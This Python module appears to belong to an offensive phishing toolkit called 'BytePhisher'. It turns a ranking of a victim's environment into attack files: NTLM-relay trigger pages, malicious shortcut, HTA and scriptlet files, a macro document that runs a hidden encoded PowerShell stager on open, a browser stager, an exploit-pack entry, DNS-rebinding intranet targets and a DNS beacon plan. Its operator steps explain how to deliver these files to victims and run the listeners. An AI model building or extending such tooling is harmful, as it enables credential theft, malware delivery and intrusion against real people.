# BytePhisher - click-to-access orchestration.
#
# `core.decision` ranks the paths a victim's own environment allows. This module turns
# that verdict into FILES: the trigger page, the shortcut, the scriptlet, the macro
# document, the stagers, the pack reference and the DNS plan, written into one output
# directory with a manifest that records what was written, by which module, and what the
# operator still has to supply before the path can run.
#
# What this module does not do:
#
#   * It delivers nothing. It writes artifacts to disk; putting them in front of a
#     victim is the operator's action, and it leaves its own evidence.
#   * It invents no input. An artifact that needs a public URL, a payload URL, a
#     relay listener or a pack payload is written only when that input is supplied;
#     otherwise the manifest records `needs-input` and names the missing piece. A path
#     that cannot be built is reported, never faked.
#   * It claims no success. `status` is one of `built`, `needs-input`, `skipped`, and
#     `operator_steps` lists the concrete next action for every ready path.
"""Turn a click-to-access verdict into buildable artifacts and one manifest.

`build_plan` is the dry run (no disk writes); `build_artifacts` writes the files into one
directory and returns the manifest. The manifest is the deliverable: every file with its
size and digest, the module that produced it, and the exact input still missing.
"""
import base64
import hashlib
import json
import os

from . import decision

__all__ = ["build_plan", "build_artifacts", "MANIFEST_NAME", "STATUSES", "RECIPES"]

MANIFEST_NAME = "manifest.json"

# The only values `status` may take on an artifact record.
STATUSES = ("built", "needs-input", "skipped")

# The stager every Windows path runs, and the browser stager for a pure-web path.
STAGER_FILES = (
    {"file": "stager.js", "kind": "stager", "builder": "js", "needs": ["payload_url"],
     "why": "browser stager: bounded beacon, download or redirect"},
    {"file": "stager.ps1", "kind": "stager", "builder": "powershell", "needs": ["payload_url"],
     "why": "PowerShell stager the macro and the shortcut run"},
)

# Per path: the artifacts it can produce and the input each one needs. `needs` names a
# build_artifacts argument, so a manifest line maps straight onto a flag.
RECIPES = {
    "T2_ntlm_relay": [
        {"file": "trigger.html", "kind": "mshtml", "builder": "object_page",
         "needs": ["public_url"], "why": "hidden sub-resource that makes MSHTML speak NTLM"},
        {"file": "trigger.url", "kind": "mshtml", "builder": "url_shortcut",
         "needs": ["public_url"], "why": "Internet shortcut to the trigger page"},
    ],
    "T5_file": [
        {"file": "payload.lnk", "kind": "mshtml", "builder": "lnk",
         "needs": ["payload_url"], "why": "shortcut that runs the PowerShell stager"},
        {"file": "payload.hta", "kind": "mshtml", "builder": "hta",
         "needs": ["payload_url"], "why": "HTML application that runs the stager"},
        {"file": "payload.sct", "kind": "mshtml", "builder": "sct",
         "needs": ["payload_url"], "why": "scriptlet that fetches the stager"},
    ],
    "T4_macro": [
        {"file": "payload.docm", "kind": "vba", "builder": "docm",
         "needs": ["payload_url"], "why": "macro document that runs the stager on open"},
    ],
    "T3_exploitpack": [
        {"file": "pack_entry.json", "kind": "exploitpack", "builder": "entry_json",
         "needs": [], "why": "the matched pack entry, for review before it is served"},
    ],
    "T1_intranet": [
        {"file": "intranet.json", "kind": "exploits", "builder": "service_rows",
         "needs": [], "why": "the local services this build attacks once the name rebounds"},
    ],
    "C1_dns": [
        {"file": "dns_plan.json", "kind": "dnsx", "builder": "dns_plan",
         "needs": ["dns_zone"], "why": "query budget, sample sequence and beacon marker"},
    ],
}

# The payload the DNS plan is built for. A beacon is the smallest useful transfer.
_DNS_SAMPLE = b"beacon"


def _sha256(data):
    return hashlib.sha256(data).hexdigest()


def _json_default(obj):
    """A bytes value inside a manifest is written as base64.

    `core.dnsx.beacon()` carries the raw payload, and a manifest that dropped it (or
    crashed on it) would be a plan the operator cannot check against the wire.
    """
    if isinstance(obj, (bytes, bytearray)):
        return base64.b64encode(bytes(obj)).decode("ascii")
    raise TypeError(f"cannot serialise {type(obj).__name__} into the manifest")


def build_plan(facts, caps=None):
    """The dry run: which files this victim's verdict calls for, and what each needs.

    No disk writes and no network. `path_ready` is the decision matrix's verdict for the
    path the file belongs to; the caller's own inputs (public_url, payload_url,
    dns_zone) are applied by build_artifacts.
    """
    cap_map = caps if caps is not None else decision.capabilities()
    verdict = decision.decide(facts, caps=cap_map)
    items = []
    for path in verdict["paths"]:
        for item in RECIPES.get(path["path"], []):
            items.append({
                "path": path["path"], "file": item["file"], "kind": item["kind"],
                "why": item["why"], "needs": list(item["needs"]),
                "path_confidence": path["confidence"], "path_ready": path["ready"],
            })
    for item in STAGER_FILES:
        items.append({"path": "any", "file": item["file"], "kind": item["kind"],
                      "why": item["why"], "needs": list(item["needs"]),
                      "path_confidence": "CONFIRMED", "path_ready": True})
    return {"facts": verdict["facts"], "best": verdict["best"],
            "summary": verdict["summary"], "items": items}


def _stager_command(payload_url, cap_map):
    """The command line a shortcut runs: the hidden encoded PowerShell stager."""
    stager = cap_map.get("stager")
    if stager is None:
        return ""
    return _call(stager, "powershell")(payload_url, style="enc")


def _lazy(name):
    try:
        module = __import__(f"core.{name}", fromlist=[name])
        return module
    except Exception:  # noqa: BLE001 - a missing module is data here, not an error
        return None


def _call(module, name):
    """The named builder on a capability module.

    A module that is present but lacks the function is a skip with a reason, not an
    exception in the middle of a build: a half-finished or older module must not take
    the other artifacts down with it.
    """
    fn = getattr(module, name, None)
    if fn is None:
        label = getattr(module, "__name__", type(module).__name__)
        raise LookupError(f"{label} has no {name}()")
    return fn


def _artifact(item, module, inputs, cap_map):
    """Build one artifact. Returns (bytes, note); raises for an unknown builder."""
    builder = item["builder"]
    if builder == "object_page":
        return _utf8(_call(module, "object_page")(inputs["public_url"])), ""
    if builder == "url_shortcut":
        return bytes(_call(module, "url_shortcut")(inputs["public_url"])), ""
    if builder == "lnk":
        command = _stager_command(inputs["payload_url"], cap_map)
        if not command:
            raise LookupError("core.stager is not available to build the shortcut")
        _, _, arguments = command.partition(" ")
        return bytes(_call(module, "lnk")("powershell.exe", arguments=arguments)), \
            "runs: " + command
    if builder == "hta":
        return _utf8(_call(module, "hta")(inputs["payload_url"])), ""
    if builder == "sct":
        return _utf8(_call(module, "sct")(inputs["payload_url"])), ""
    if builder == "docm":
        source = _call(module, "open_macro")(inputs["payload_url"], module="AutoOpen")
        return bytes(_call(module, "docm")(source, module="Module1")), ""
    if builder == "js":
        return _utf8(_call(module, "js")({"url": inputs["payload_url"],
                                          "mode": "beacon"})), ""
    if builder == "powershell":
        return _utf8(_call(module, "powershell")(inputs["payload_url"], style="enc")), ""
    if builder == "dns_plan":
        zone = inputs["dns_zone"]
        payload = {
            "capability": module.plan(),
            "sample_payload": _DNS_SAMPLE.decode("ascii"),
            "sample": module.query_plan(_DNS_SAMPLE, zone),
            "beacon": module.beacon(_DNS_SAMPLE, zone),
        }
        return _utf8(json.dumps(payload, indent=2, sort_keys=True,
                                default=_json_default)), ""
    if builder == "service_rows":
        rows = getattr(module, "EXPLOITS", []) if module is not None else []
        return _utf8(json.dumps(rows, indent=2, sort_keys=True,
                                default=_json_default)), ""
    if builder == "entry_json":
        pack = _lazy("exploitpack")
        rows = getattr(pack, "PACK", []) if pack is not None else []
        return _utf8(json.dumps(rows, indent=2, sort_keys=True,
                                default=_json_default)), ""
    raise ValueError(f"no builder for {builder!r}")


def _utf8(value):
    return value.encode("utf-8") if isinstance(value, str) else bytes(value)


def build_artifacts(facts, out_dir, *, caps=None, public_url="", payload_url="",
                    dns_zone="", pack_dir="", include_stagers=True):
    """Write the artifacts for every path this victim allows into `out_dir`.

    Returns the manifest. File names come from RECIPES/STAGER_FILES, never from input,
    so a hostile value cannot steer a write out of the directory.
    """
    if not out_dir:
        raise ValueError("build_artifacts needs an output directory")
    out_dir = os.path.abspath(out_dir)
    os.makedirs(out_dir, exist_ok=True)
    cap_map = caps if caps is not None else decision.capabilities()
    verdict = decision.decide(facts, caps=cap_map)
    inputs = {"public_url": public_url, "payload_url": payload_url, "dns_zone": dns_zone}

    wanted = [(p["path"], item) for p in verdict["paths"]
              for item in RECIPES.get(p["path"], [])]
    if include_stagers:
        wanted += [("any", item) for item in STAGER_FILES]

    records = []
    for path, item in wanted:
        record = {"path": path, "file": item["file"], "kind": item["kind"],
                  "why": item["why"]}
        missing = [n for n in item["needs"] if not inputs.get(n)]
        module = cap_map.get(item["kind"])
        if missing:
            record["status"] = "needs-input"
            record["needs"] = missing
            records.append(record)
            continue
        if module is None:
            record["status"] = "skipped"
            record["reason"] = f"core.{item['kind']} is not available"
            records.append(record)
            continue
        try:
            data, note = _artifact(item, module, inputs, cap_map)
        except (LookupError, TypeError, ValueError) as exc:
            record["status"] = "skipped"
            record["reason"] = str(exc)
            records.append(record)
            continue
        with open(os.path.join(out_dir, item["file"]), "wb") as handle:
            handle.write(data)
        record.update({"status": "built", "bytes": len(data), "sha256": _sha256(data)})
        if note:
            record["note"] = note
        records.append(record)

    manifest = {
        "version": 1,
        "facts": verdict["facts"],
        "summary": verdict["summary"],
        "best": verdict["best"],
        "inputs": {"public_url": public_url, "payload_url": payload_url,
                   "dns_zone": dns_zone},
        "artifacts": records,
        "counts": {status: sum(1 for r in records if r["status"] == status)
                   for status in STATUSES},
        "operator_steps": _operator_steps(verdict),
    }
    if pack_dir:
        manifest["pack"] = _pack_report(cap_map.get("exploitpack"), pack_dir)
    with open(os.path.join(out_dir, MANIFEST_NAME), "w", encoding="utf-8") as handle:
        json.dump(manifest, handle, indent=2, sort_keys=True)
        handle.write("\n")
    return manifest


def _pack_report(pack, pack_dir):
    if pack is None or not hasattr(pack, "report"):
        return {"ok": False, "reason": "core.exploitpack is not available"}
    try:
        report = pack.report(pack_dir)
    except Exception as exc:  # noqa: BLE001 - a broken pack is a manifest entry, not a crash
        return {"ok": False, "reason": f"pack unreadable: {exc}"}
    if not isinstance(report, dict):
        return {"ok": False, "reason": f"pack report is {type(report).__name__}"}
    return {"ok": True, **report}


def _operator_steps(verdict):
    """The next concrete action for every ready path. A path with no next step is a path
    nobody runs, so this list is part of the deliverable."""
    steps = []
    for path in verdict["paths"]:
        if not path["ready"]:
            continue
        name = path["path"]
        if name == "T2_ntlm_relay":
            steps.append("start the NTLM listener (core.relay) and point trigger.html at "
                         "it; the relay target must accept the authentication")
        elif name == "T4_macro":
            steps.append("deliver payload.docm and confirm the host opens it with macros "
                         "enabled")
        elif name == "T5_file":
            steps.append("deliver the shortcut or scriptlet over a channel the victim "
                         "opens")
        elif name == "T3_exploitpack":
            steps.append("place the matched entry's payload under the pack directory and "
                         "re-run --pack-verify before serving it")
        elif name == "T1_intranet":
            steps.append("start the rebinding responder (--rebind-domain) and confirm the "
                         "service list against the victim's network")
        elif name == "C1_dns":
            steps.append("run the authoritative responder for the zone and watch its "
                         "query log for the beacon")
    return steps
